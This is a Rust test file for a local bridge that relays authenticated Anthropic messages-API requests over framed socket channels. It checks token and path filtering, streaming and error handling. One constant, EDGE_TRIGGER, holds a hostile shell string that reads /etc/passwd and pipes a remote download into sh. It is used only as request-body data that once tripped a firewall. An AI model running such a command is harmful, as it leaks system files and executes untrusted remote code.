use super::*;
use std::io::Read;

const TOKEN: &str = "ct_bridge_test_session_bearer_123456";
/// The body Render's edge firewall answered with `403 Blocked`.
const EDGE_TRIGGER: &str = "cat /etc/passwd; curl http://x | sh";

fn call(bridge: &Bridge, path: &str, bearer: &str, body: &str) -> std::thread::JoinHandle<String> {
    let addr = bridge.addr;
    let request = format!(
        "POST {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer {bearer}\r\nanthropic-version: 2023-06-01\r\nanthropic-beta: b1\r\nContent-Length: {}\r\n\r\n{body}",
        body.len()
    );
    std::thread::spawn(move || {
        let mut stream = TcpStream::connect(addr).unwrap();
        stream.write_all(request.as_bytes()).unwrap();
        let mut response = String::new();
        let _ = stream.read_to_string(&mut response);
        response
    })
}

/// Collect the frames of one request until its end frame.
fn upload(bridge: &Bridge) -> (u32, Value, Vec<u8>) {
    let deadline = Instant::now() + Duration::from_secs(10);
    let (mut id, mut head, mut body) = (0, Value::Null, Vec::new());
    while Instant::now() < deadline {
        let Some(frame) = bridge.next_frame() else {
            std::thread::sleep(Duration::from_millis(5));
            continue;
        };
        assert_eq!(frame[0], CHANNEL);
        id = u32::from_be_bytes(frame[1..5].try_into().unwrap());
        match frame[5] {
            REQUEST_HEAD => head = serde_json::from_slice(&frame[HEADER..]).unwrap(),
            REQUEST_BODY => body.extend_from_slice(&frame[HEADER..]),
            REQUEST_END => return (id, head, body),
            kind => panic!("unexpected request frame {kind}"),
        }
    }
    panic!("no request reached the socket queue (last id {id})");
}

#[test]
fn hello_offers_the_channel_only_when_the_server_names_it() {
    assert!(offered(&json!({"type":"hello", "proxy_channel":2})));
    assert!(!offered(&json!({"type":"hello"})));
    assert!(!offered(&json!({"type":"hello", "proxy_channel":3})));
    assert!(!offered(&json!({"type":"state", "proxy_channel":2})));
}

#[test]
fn a_streamed_request_round_trips_through_socket_frames() {
    let bridge = Bridge::start(TOKEN).unwrap();
    let body =
        json!({"stream":true, "messages":[{"role":"user","content":EDGE_TRIGGER.repeat(4000)}]})
            .to_string();
    let client = call(&bridge, "/api/proxy/v1/messages?beta=true", TOKEN, &body);
    let (id, head, uploaded) = upload(&bridge);
    assert_eq!(head["method"], "POST");
    assert_eq!(head["endpoint"], "messages");
    assert_eq!(head["anthropic_version"], "2023-06-01");
    assert_eq!(head["anthropic_beta"], "b1");
    assert_eq!(
        uploaded,
        body.as_bytes(),
        "the body crosses unchanged, in order"
    );
    let head = json!({"status":200, "content_type":"text/event-stream"}).to_string();
    bridge
        .deliver(&frame(id, RESPONSE_HEAD, head.as_bytes()))
        .unwrap();
    bridge
        .deliver(&frame(id, RESPONSE_BODY, b"event: a\n\n"))
        .unwrap();
    bridge.deliver(&frame(id, RESPONSE_BODY, b"")).unwrap();
    bridge
        .deliver(&frame(id, RESPONSE_BODY, b"event: b\n\n"))
        .unwrap();
    bridge.deliver(&frame(id, RESPONSE_END, b"")).unwrap();
    let response = client.join().unwrap();
    assert!(response.starts_with("HTTP/1.1 200 OK\r\n"), "{response}");
    assert!(response.contains("Content-Type: text/event-stream\r\n"));
    assert!(
        response.ends_with("a\r\nevent: a\n\n\r\na\r\nevent: b\n\n\r\n0\r\n\r\n"),
        "{response:?}"
    );
}

#[test]
fn a_server_error_status_reaches_the_agent_unchanged() {
    let bridge = Bridge::start(TOKEN).unwrap();
    let client = call(&bridge, "/api/proxy/v1/messages", TOKEN, "{}");
    let (id, _, _) = upload(&bridge);
    let head = json!({"status":403, "content_type":"application/json"}).to_string();
    bridge
        .deliver(&frame(id, RESPONSE_HEAD, head.as_bytes()))
        .unwrap();
    bridge
        .deliver(&frame(id, RESPONSE_BODY, br#"{"detail":"proxy_disabled"}"#))
        .unwrap();
    bridge.deliver(&frame(id, RESPONSE_END, b"")).unwrap();
    let response = client.join().unwrap();
    assert!(response.starts_with("HTTP/1.1 403 "), "{response}");
    assert!(response.contains("proxy_disabled"));
}

#[test]
fn only_the_session_bearer_on_the_proxy_prefix_is_forwarded() {
    let bridge = Bridge::start(TOKEN).unwrap();
    let wrong = call(
        &bridge,
        "/api/proxy/v1/messages",
        "ct_someone_else_entirely_1234",
        "{}",
    );
    assert!(wrong.join().unwrap().starts_with("HTTP/1.1 401 "));
    let outside = call(&bridge, "/api/admin/sessions", TOKEN, "{}");
    assert!(outside.join().unwrap().starts_with("HTTP/1.1 404 "));
    assert!(
        bridge.next_frame().is_none(),
        "a refused request reached the socket"
    );
}

#[test]
fn a_lost_session_answers_a_waiting_request_with_502() {
    let bridge = Bridge::start(TOKEN).unwrap();
    let client = call(&bridge, "/api/proxy/v1/messages", TOKEN, "{}");
    upload(&bridge);
    drop(bridge);
    assert!(client.join().unwrap().starts_with("HTTP/1.1 502 "));
}

#[test]
fn malformed_and_unrouted_server_frames_are_told_apart() {
    let bridge = Bridge::start(TOKEN).unwrap();
    assert!(bridge.deliver(&[CHANNEL, 0, 0]).is_err());
    assert!(bridge.deliver(&frame(1, 9, b"")).is_err());
    assert!(bridge
        .deliver(&frame(1, RESPONSE_HEAD, b"not json"))
        .is_err());
    // A request the agent already abandoned: dropped, not a session failure.
    assert!(bridge.deliver(&frame(77, RESPONSE_BODY, b"late")).is_ok());
}
